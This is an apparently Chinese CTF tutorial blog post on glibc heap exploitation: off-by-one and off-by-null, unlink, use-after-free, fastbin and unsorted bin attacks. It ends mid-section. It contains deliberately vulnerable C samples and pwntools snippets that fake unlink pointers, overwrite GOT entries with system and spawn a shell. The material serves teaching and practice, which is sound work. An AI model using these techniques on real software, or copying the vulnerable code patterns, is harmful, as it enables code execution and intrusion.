<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">chunk=<span class="built_in">malloc</span>(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//根据系统的位数，malloc会分配8或16字节的用户空间</span></span><br><span class="line"><span class="number">0x602000</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000021</span></span><br><span class="line"><span class="number">0x602010</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602020</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000020fe1</span></span><br><span class="line"><span class="number">0x602030</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>

<p>注意用户区域的大小不等于 chunk_head.size，chunk_head.size = 用户区域大小 + 2 * 字长</p>
<p>还有一点是之前所说的用户申请的内存大小会被修改，其有可能会使用与其物理相邻的下一个 chunk 的 prev_size 字段储存内容。回头再来看下之前的示例代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *chunk;</span><br><span class="line">  chunk=<span class="built_in">malloc</span>(<span class="number">24</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Get input:"</span>);</span><br><span class="line">  gets(chunk);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>观察如上代码，我们申请的 chunk 大小是 24 个字节。但是我们将其编译为 64 位可执行程序时，实际上分配的内存会是 16 个字节而不是 24 个。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x602000</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000021</span></span><br><span class="line"><span class="number">0x602010</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602020</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000020fe1</span></span><br></pre></td></tr></table></figure>

<p>16 个字节的空间是如何装得下 24 个字节的内容呢？答案是借用了下一个块的 pre_size 域。我们可来看一下用户申请的内存大小与 glibc 中实际分配的内存大小之间的转换。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* pad request bytes into a usable size -- internal version */</span></span><br><span class="line"><span class="comment">//MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> request2size(req)                                                      \</span></span><br><span class="line">    (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)                           \</span><br><span class="line">         ? MINSIZE                                                             \</span><br><span class="line">         : ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</span><br></pre></td></tr></table></figure>

<p>当 req=24 时，request2size(24)=32。而除去 chunk 头部的 16 个字节。实际上用户可用 chunk 的字节数为 16。而根据我们前面学到的知识可以知道 chunk 的 pre_size 仅当它的前一块处于释放状态时才起作用。所以用户这时候其实还可以使用下一个 chunk 的 prev_size 字段，正好 24 个字节。<strong>实际上 ptmalloc 分配内存是以双字为基本单位，以 64 位系统为例，分配出来的空间是 16 的整数倍，即用户申请的 chunk 都是 16 字节对齐的</strong>。</p>
<h2 id="堆中的-Off-By系列"><a href="#堆中的-Off-By系列" class="headerlink" title="堆中的 Off-By系列"></a>堆中的 Off-By系列</h2><p>严格来说 off-by-one 漏洞是一种特殊的溢出漏洞，off-by-one 指程序向缓冲区中写入时，写入的字节数超过了这个缓冲区本身所申请的字节数并且只越界了一个字节。</p>
<h3 id="off-by-one-漏洞原理"><a href="#off-by-one-漏洞原理" class="headerlink" title="off-by-one 漏洞原理"></a>off-by-one 漏洞原理</h3><p>off-by-one 是指单字节缓冲区溢出，这种漏洞的产生往往与边界验证不严和字符串操作有关，当然也不排除写入的 size 正好就只多了一个字节的情况。其中边界验证不严通常包括</p>
<ul>
<li>使用循环语句向堆块中写入数据时，循环的次数设置错误（这在 C 语言初学者中很常见）导致多写入了一个字节。</li>
<li>字符串操作不合适</li>
</ul>
<p>一般来说，单字节溢出被认为是难以利用的，但是因为 Linux 的堆管理机制 ptmalloc 验证的松散性，基于 Linux 堆的 off-by-one 漏洞利用起来并不复杂，并且威力强大。 此外，需要说明的一点是 off-by-one 是可以基于各种缓冲区的，比如栈、bss 段等等，但是堆上（heap based） 的 off-by-one 是 CTF 中比较常见的。我们这里仅讨论堆上的 off-by-one 情况。</p>
<h3 id="off-by-one-利用思路"><a href="#off-by-one-利用思路" class="headerlink" title="off-by-one 利用思路"></a>off-by-one 利用思路</h3><p>1.溢出字节为可控制任意字节：通过修改大小造成块结构之间出现重叠，从而泄露其他块数据，或是覆盖其他块数据。也可使用 NULL 字节溢出的方法</p>
<p>2.溢出字节为 NULL 字节：在 size 为 0x100 的时候，溢出 NULL 字节可以使得 <code>prev_in_use</code> 位被清，这样前块会被认为是 free 块。（1） 这时可以选择使用 unlink 方法（见 unlink 部分）进行处理。（2） 另外，这时 <code>prev_size</code> 域就会启用，就可以伪造 <code>prev_size</code> ，从而造成块之间发生重叠。此方法的关键在于 unlink 的时候没有检查按照 <code>prev_size</code> 找到的块的大小与<code>prev_size</code> 是否一致。</p>
<p>最新版本代码中，已加入针对 2 中后一种方法的 check ，但是在 2.28 及之前版本并没有该 check 。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* consolidate backward */</span></span><br><span class="line">    <span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">      prevsize = prev_size (p);</span><br><span class="line">      <span class="built_in">size</span> += prevsize;</span><br><span class="line">      p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));</span><br><span class="line">      <span class="comment">/* 后两行代码在最新版本中加入，则 2 的第二种方法无法使用，但是 2.28 及之前都没有问题 */</span></span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))</span><br><span class="line">        malloc_printerr (<span class="string">"corrupted size vs. prev_size while consolidating"</span>);</span><br><span class="line">      unlink_chunk (av, p);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="off-by-one的示例"><a href="#off-by-one的示例" class="headerlink" title="off-by-one的示例"></a>off-by-one的示例</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">my_gets</span><span class="params">(<span class="keyword">char</span> *ptr,<span class="keyword">int</span> <span class="built_in">size</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;=<span class="built_in">size</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        ptr[i]=getchar();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> <span class="built_in">buffer</span>[<span class="number">40</span>]=<span class="string">""</span>;</span><br><span class="line">    <span class="keyword">void</span> *chunk1;</span><br><span class="line">    chunk1=<span class="built_in">malloc</span>(<span class="number">24</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Get Input"</span>);</span><br><span class="line">    gets(<span class="built_in">buffer</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strlen</span>(<span class="built_in">buffer</span>)==<span class="number">24</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">strcpy</span>(chunk1,<span class="built_in">buffer</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>程序乍看上去没有任何问题（不考虑栈溢出），可能很多人在实际的代码中也是这样写的。 但是 strlen 和 strcpy 的行为不一致却导致了 off-by-one 的发生。 strlen 是我们很熟悉的计算 ascii 字符串长度的函数，这个函数在计算字符串长度时是不把结束符 <code>&#39;\x00&#39;</code> 计算在内的，但是 strcpy 在复制字符串时会拷贝结束符 <code>&#39;\x00&#39;</code> 。这就导致了我们向 chunk1 中写入了 25 个字节。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x602000:   0x0000000000000000  0x0000000000000021 &lt;&#x3D;&#x3D;&#x3D; chunk1</span><br><span class="line">0x602010:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602020:   0x0000000000000000  0x0000000000000411 &lt;&#x3D;&#x3D;&#x3D; next chunk</span><br></pre></td></tr></table></figure>

<p>在我们输入’A’*24 后执行 strcpy</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x602000:   0x0000000000000000  0x0000000000000021</span><br><span class="line">0x602010:   0x4141414141414141  0x4141414141414141</span><br><span class="line">0x602020:   0x4141414141414141  0x0000000000000400</span><br></pre></td></tr></table></figure>

<p>可以看到 next chunk 的 size 域低字节被结束符 <code>&#39;\x00&#39;</code> 覆盖，这种又属于 off-by-one 的一个分支称为 NULL byte off-by-one、off-by-NULL，我们在后面会看到 off-by-one 与 NULL byte off-by-one 在利用上的区别。 还是有一点就是为什么是低字节被覆盖呢，因为我们通常使用的 CPU 的字节序都是小端法的，比如一个 DWORD 值在使用小端法的内存中是这样储存的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DWORD 0x41424344</span><br><span class="line">内存  0x44,0x43,0x42,0x41</span><br></pre></td></tr></table></figure>

<h3 id="在-libc-2-29-之后"><a href="#在-libc-2-29-之后" class="headerlink" title="在 libc-2.29 之后"></a>在 libc-2.29 之后</h3><p>由于这两行代码的加入</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))</span><br><span class="line">  malloc_printerr (<span class="string">"corrupted size vs. prev_size while consolidating"</span>);</span><br></pre></td></tr></table></figure>

<p>由于我们难以控制一个真实 chunk 的 size 字段，所以传统的 off-by-null 方法失效。但是，只需要满足被 unlink 的 chunk 和下一个 chunk 相连，所以仍然可以伪造 fake_chunk。</p>
<p>伪造的方式就是使用 large bin 遗留的 fd_nextsize 和 bk_nextsize 指针。以 fd_nextsize 为 fake_chunk 的 fd，bk_nextsize 为 fake_chunk 的 bk，这样我们可以完全控制该 fake_chunk 的 size 字段（这个过程会破坏原 large bin chunk 的 fd 指针，但是没有关系），同时还可以控制其 fd（通过部分覆写 fd_nextsize）。通过在后面使用其他的 chunk 辅助伪造，可以通过该检测。</p>
<p>然后只需要通过 unlink 的检测就可以了，也就是 <code>fd-&gt;bk == p &amp;&amp; bk-&gt;fd == p</code></p>
<p>如果 large bin 中仅有一个 chunk，那么该 chunk 的两个 nextsize 指针都会指向自己，如下</p>
<p><img src= "/img/loading.gif" data-src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/largebin-struct.png" alt="largebin-struct"></p>
<p>我们可以控制 fd_nextsize 指向堆上的任意地址，可以容易地使之指向一个 fastbin + 0x10 - 0x18，而 fastbin 中的 fd 也会指向堆上的一个地址，通过部分覆写该指针也可以使该指针指向之前的 large bin + 0x10，这样就可以通过 <code>fd-&gt;bk == p</code> 的检测。</p>
<p>由于 bk_nextsize 我们无法修改，所以 bk-&gt;fd 必然在原先的 large bin chunk 的 fd 指针处（这个 fd 被我们破坏了）。通过 fastbin 的链表特性可以做到修改这个指针且不影响其他的数据，再部分覆写之就可以通过 <code>bk-&gt;fd==p</code> 的检测了。</p>
<p>然后通过 off-by-one 向低地址合并就可以实现 chunk overlapping 了，之后可以 leak libc_base 和 堆地址，tcache 打 __free_hook 即可。</p>
<h2 id="Chunk-Extend-and-Overlapping"><a href="#Chunk-Extend-and-Overlapping" class="headerlink" title="Chunk Extend and Overlapping"></a>Chunk Extend and Overlapping</h2><p>chunk extend 是堆漏洞的一种常见利用手法，通过 extend 可以实现 chunk overlapping 的效果。这种利用方法需要以下的时机和条件：</p>
<ul>
<li>程序中存在基于堆的漏洞</li>
<li>漏洞可以控制 chunk header 中的数据</li>
</ul>
<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>chunk extend 技术能够产生的原因在于 ptmalloc 在对堆 chunk 进行操作时使用的各种宏。</p>
<p>在 ptmalloc 中，获取 chunk 块大小的操作如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Get size, ignoring use bits */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunksize(p) (chunksize_nomask(p) &amp; ~(SIZE_BITS))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Like chunksize, but do not mask SIZE_BITS.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunksize_nomask(p) ((p)-&gt;mchunk_size)</span></span><br></pre></td></tr></table></figure>

<p>一种是直接获取 chunk 的大小，不忽略掩码部分，另外一种是忽略掩码部分。</p>
<p>在 ptmalloc 中，获取下一 chunk 块地址的操作如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Ptr to next physical malloc_chunk. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> next_chunk(p) ((mchunkptr)(((char *) (p)) + chunksize(p)))</span></span><br></pre></td></tr></table></figure>

<p>即通过 malloc_chunk-&gt;prev_size 获取前一块大小，然后使用本 chunk 地址减去所得大小。</p>
<p>在 ptmalloc，判断当前 chunk 是否是 use 状态的操作如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> inuse(p)</span></span><br><span class="line">    ((((mchunkptr)(((<span class="keyword">char</span> *) (p)) + chunksize(p)))-&gt;mchunk_size) &amp; PREV_INUSE)</span><br></pre></td></tr></table></figure>

<p>即查看下一 chunk 的 prev_inuse 域，而下一块地址又如我们前面所述是根据当前 chunk 的 size 计算得出的。</p>
<p>通过上面几个宏可以看出，ptmalloc 通过 chunk header 的数据判断 chunk 的使用情况和对 chunk 的前后块进行定位。简而言之，chunk extend 就是通过控制 size 和 pre_size 域来实现跨越块操作从而导致 overlapping 的。</p>
<p>与 chunk extend 类似的还有一种称为 chunk shrink 的操作。这里只介绍 chunk extend 的利用。</p>
<h2 id="Unlink"><a href="#Unlink" class="headerlink" title="Unlink"></a>Unlink</h2><h3 id="Unlink原理"><a href="#Unlink原理" class="headerlink" title="Unlink原理"></a>Unlink原理</h3><ul>
<li>简介</li>
</ul>
<p>俗称脱链，就是将链表处的free堆块unsorted bin中脱离出来，然后和<strong>物理地址相邻</strong>的新free的堆块合并成大堆块（向前合并或者向后合并），再放入到unsorted bin中</p>
<ul>
<li>危害原理</li>
</ul>
<p>通过伪造free状态的fake_chunk，<strong>伪造fd指针和bk指针</strong>，通过绕过unlink的检测实现unlink，unlink就会往ptr（已经合并的堆块）所在的位置写入ptr-0x18，从而实现任意地址写的漏洞</p>
<ul>
<li>漏洞产生原因<ul>
<li>off-by-null、off-by-one、堆溢出，修改了堆块的使用标志位</li>
<li>UAF ，可修改 free 状态下 smallbin 或是 unsorted bin 的 fd 和 bk 指针</li>
</ul>
</li>
</ul>
<p>两个条件：修改标志位（使用状态变成free状态）；修改fd、bk指针绕过检测，（未开启PIE）</p>
<ul>
<li>思路</li>
</ul>
<p>设指向可 UAF chunk 的指针的地址为 ptr</p>
<ol>
<li>修改 fd 为 ptr - 0x18</li>
<li>修改 bk 为 ptr - 0x10</li>
<li>触发 unlink</li>
</ol>
<p>ptr 处的指针会变为 ptr - 0x18。</p>
<ul>
<li>效果</li>
</ul>
<p>使得已指向 UAF chunk 的指针 ptr 变为 ptr - 0x18</p>
<h3 id="unlink的绕过-amp-利用"><a href="#unlink的绕过-amp-利用" class="headerlink" title="unlink的绕过&amp;利用"></a>unlink的绕过&amp;利用</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">ptr=<span class="number">0x602300</span> <span class="comment"># 准备合并的堆块的位置</span></span><br><span class="line">malloc(<span class="number">0</span>,<span class="number">0x30</span>)</span><br><span class="line">malloc(<span class="number">1</span>,<span class="number">0xf0</span>)</span><br><span class="line">malloc(<span class="number">2</span>,<span class="number">0x100</span>)</span><br><span class="line">malloc(<span class="number">3</span>,<span class="number">0x100</span>)</span><br><span class="line">fd=ptr<span class="number">-0x18</span></span><br><span class="line">bk=ptr<span class="number">-0x10</span></span><br><span class="line">py=p64(<span class="number">0</span>)+p64(<span class="number">0x31</span>)</span><br><span class="line">py+=p64(fd)+p64(bk)</span><br><span class="line">py+=p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</span><br><span class="line">py+=p64(<span class="number">0x30</span>)+p64(<span class="number">0x100</span>) <span class="comment"># 覆盖下一段presize和size，伪造成free的堆块，写下一块的size时用到了offbyone，利用溢出的一个字节</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x60</span>,py)</span><br><span class="line">free(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p><img src= "/img/loading.gif" data-src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/image-20220327211845709.png" alt="image-20220327211845709"></p>
<p>free(1)后</p>
<p><img src= "/img/loading.gif" data-src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/image-20220327212806497.png" alt="image-20220327212806497"></p>
<p><img src= "/img/loading.gif" data-src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/image-20220327212816483.png" alt="image-20220327212816483"></p>
<p>对0号块写时就会向0x6022e8写，就可以覆盖chunk的几个指针，可以指向我们需要的任意地址，比如system，对这些chunk操作就可以操作到对应位置。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">py=<span class="string">b'a'</span>*<span class="number">0x18</span></span><br><span class="line">py+=p64(atoi_got)</span><br><span class="line">py+=p64(atoi_got)</span><br><span class="line">py+=p64(free_got)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x60</span>,py)</span><br></pre></td></tr></table></figure>

<p><img src= "/img/loading.gif" data-src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/image-20220327213603865.png" alt="image-20220327213603865"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">2</span>,<span class="number">0x10</span>,p64(puts_plt))</span><br></pre></td></tr></table></figure>

<p><img src= "/img/loading.gif" data-src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/image-20220327214423039.png" alt="image-20220327214423039"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">free(<span class="number">0</span>) <span class="comment"># puts(atoi_addr)</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b'\x00'</span>))-libc.sym[<span class="string">"atoi"</span>]</span><br><span class="line">system=addr+libc.sym[<span class="string">"system"</span>]</span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0x10</span>,p64(system)) <span class="comment"># atoi-&gt;system</span></span><br><span class="line">p.recvuntil(<span class="string">"your choice:"</span>) <span class="comment"># atoi()</span></span><br><span class="line">p.sendline(<span class="string">"/bin/sh\x00"</span>) <span class="comment"># system("/bin/sh")</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>或者另一种</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">2</span>,<span class="number">0x10</span>,p64(system)) <span class="comment"># free-&gt;system</span></span><br><span class="line">edit(<span class="number">3</span>,<span class="number">0x10</span>,<span class="string">"/bin/sh\x00"</span>) <span class="comment"># binsh写入3号块</span></span><br><span class="line">free(<span class="number">3</span>) <span class="comment"># system("/bin/sh")</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="Use-After-Free"><a href="#Use-After-Free" class="headerlink" title="Use After Free"></a>Use After Free</h2><h3 id="UAF原理"><a href="#UAF原理" class="headerlink" title="UAF原理"></a>UAF原理</h3><ul>
<li>内存块被释放后，其对应的指针被设置为 NULL ， 然后再次使用，自然程序会崩溃。</li>
<li>内存块被释放后，其对应的指针没有被设置为 NULL ，然后在它下一次被使用之前，没有代码对这块内存块进行修改，那么<strong>程序很有可能可以正常运转</strong>。</li>
<li>内存块被释放后，其对应的指针没有被设置为 NULL，但是在它下一次使用之前，有代码对这块内存进行了修改，那么当程序再次使用这块内存时，<strong>就很有可能会出现奇怪的问题</strong>。</li>
</ul>
<p>而我们一般所指的 <strong>Use After Free</strong> 漏洞主要是后两种。此外，<strong>我们一般称被释放后没有被设置为 NULL 的内存指针为 dangling pointer。</strong> </p>
<h2 id="Fastbin-attack"><a href="#Fastbin-attack" class="headerlink" title="Fastbin attack"></a>Fastbin attack</h2><p>fastbin attack 是一类漏洞的利用方法，是指所有基于 fastbin 机制的漏洞利用方法。这类利用的前提是：</p>
<ul>
<li>存在堆溢出、use-after-free 等能控制 chunk 内容的漏洞</li>
<li>漏洞发生于 fastbin 类型的 chunk 中</li>
</ul>
<h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>fastbin通过单链表连接，修改其fd即可控制下一个申请的地址。</p>
<p>并且由 fastbin 管理的 chunk 即使被释放，其 next_chunk 的 prev_inuse 位也不会被清空。 </p>
<p>条件：size位与fastbin对应。</p>
<h3 id="攻击方法分类"><a href="#攻击方法分类" class="headerlink" title="攻击方法分类"></a>攻击方法分类</h3><ul>
<li>Fastbin Double Free</li>
<li>House of Spirit</li>
<li>Alloc to Stack</li>
<li>Arbitrary Alloc</li>
</ul>
<p>其中，前两种主要漏洞侧重于利用 <code>free</code> 函数释放<strong>真的 chunk 或伪造的 chunk</strong>，然后再次申请 chunk 进行攻击，后两种侧重于故意修改 <code>fd</code> 指针，直接利用 <code>malloc</code> 申请指定位置 chunk 进行攻击。</p>
<h3 id="Fastbin-Double-Free"><a href="#Fastbin-Double-Free" class="headerlink" title="Fastbin Double Free"></a>Fastbin Double Free</h3><p>Fastbin Double Free 是指 fastbin 的 chunk 可以被多次释放，因此可以在 fastbin 链表中存在多次。这样导致的后果是多次分配可以从 fastbin 链表中取出同一个堆块，相当于多个指针指向同一个堆块，结合堆块的数据内容可以实现类似于类型混淆 (type confused) 的效果。</p>
<p>Fastbin Double Free 能够成功利用主要有两部分的原因</p>
<ol>
<li>fastbin 的堆块被释放后 next_chunk 的 pre_inuse 位不会被清空</li>
<li>fastbin 在执行 free 的时候仅验证了 main_arena 直接指向的块，即链表指针头部的块。对于链表后面的块，并没有进行验证。</li>
</ol>
<p>通过 fastbin double free 我们可以使用多个指针控制同一个堆块，这可以用于篡改一些堆块中的关键数据域或者是实现类似于类型混淆的效果。 如果更进一步修改 fd 指针，则能够实现任意地址分配堆块的效果 (首先要通过验证)，这就相当于任意地址写任意值的效果。</p>
<h3 id="House-of-Spirit"><a href="#House-of-Spirit" class="headerlink" title="House of Spirit"></a>House of Spirit</h3><p>House of Spirit 是 <code>the Malloc Maleficarum</code> 中的一种技术。</p>
<p>该技术的核心在于在目标位置处伪造 fastbin chunk，并将其释放，从而达到分配<strong>指定地址</strong>的 chunk 的目的。</p>
<p>要想构造 fastbin fake chunk，并且将其释放时，可以将其放入到对应的 fastbin 链表中，需要绕过一些必要的检测，即</p>
<ul>
<li>fake chunk 的 ISMMAP 位不能为 1，因为 free 时，如果是 mmap 的 chunk，会单独处理。</li>
<li>fake chunk 地址需要对齐， MALLOC_ALIGN_MASK</li>
<li>fake chunk 的 size 大小需要满足对应的 fastbin 的需求，同时也得对齐。</li>
<li>fake chunk 的 next chunk 的大小不能小于 <code>2 * SIZE_SZ</code>，同时也不能大于<code>av-&gt;system_mem</code> 。</li>
<li>fake chunk 对应的 fastbin 链表头部不能是该 fake chunk，即不能构成 double free 的情况。</li>
</ul>
<p>至于为什么要绕过这些检测，可以参考 free 部分的源码。</p>
<p>使用该技术分配 chunk 到指定地址，其实并不需要修改指定地址的任何内容，<strong>关键是要能够修改指定地址的前后的内容使其可以绕过对应的检测</strong>。</p>
<h3 id="Alloc-to-Stack"><a href="#Alloc-to-Stack" class="headerlink" title="Alloc to Stack"></a>Alloc to Stack</h3><p>该技术的核心点在于劫持 fastbin 链表中 chunk 的 fd 指针，把 fd 指针指向我们想要分配的栈上，从而实现控制栈中的一些关键数据，比如返回地址等。</p>
<p>这次我们把 fake_chunk 置于栈中称为 stack_chunk，同时劫持了 fastbin 链表中 chunk 的 fd 值，通过把这个 fd 值指向 stack_chunk 就可以实现在栈中分配 fastbin chunk。</p>
<p>通过该技术我们可以把 fastbin chunk 分配到栈中，从而控制返回地址等关键数据。要实现这一点我们需要劫持 fastbin 中 chunk 的 fd 域，把它指到栈上，当然同时需要栈上存在有满足条件的 size 值。</p>
<h3 id="Arbitrary-Alloc"><a href="#Arbitrary-Alloc" class="headerlink" title="Arbitrary Alloc"></a>Arbitrary Alloc</h3><p>Arbitrary Alloc 其实与 Alloc to stack 是完全相同的，唯一的区别是分配的目标不再是栈中。 事实上只要满足目标地址存在合法的 size 域（这个 size 域是构造的，还是自然存在的都无妨），我们可以把 chunk 分配到任意的可写内存中，比如 bss、heap、data、stack 等等。</p>
<p>我们使用字节错位来实现直接分配 fastbin 到<strong>_malloc_hook 的位置，相当于覆盖 _malloc_hook 来控制程序流程</strong>。</p>
<p>Arbitrary Alloc 在 CTF 中用地更加频繁。我们可以利用字节错位等方法来绕过 size 域的检验，实现任意地址分配 chunk，最后的效果也就相当于任意地址写任意值。</p>
<h2 id="Unsorted-Bin-Attack"><a href="#Unsorted-Bin-Attack" class="headerlink" title="Unsorted Bin Attack"></a>Unsorted Bin Attack</h2><p>Unsorted Bin Attack，顾名思义，该攻击与 Glibc 堆管理中的的 Unsorted Bin 的机制紧密相关。</p>
<p>Unsorted Bin Attack 被利用的前提是控制 Unsorted Bin Chunk 的 bk 指针。</p>
<p>Unsorted Bin Attack 可以达到的效果是实现修改任意地址值为一个较大的数值。</p>
<h3 id="基本来源"><a href="#基本来源" class="headerlink" title="基本来源"></a>基本来源</h3><ol>
<li>当一个较大的 chunk 被分割成两半后，如果剩下的部分大于 MINSIZE，就会被放到 unsorted bin 中。</li>
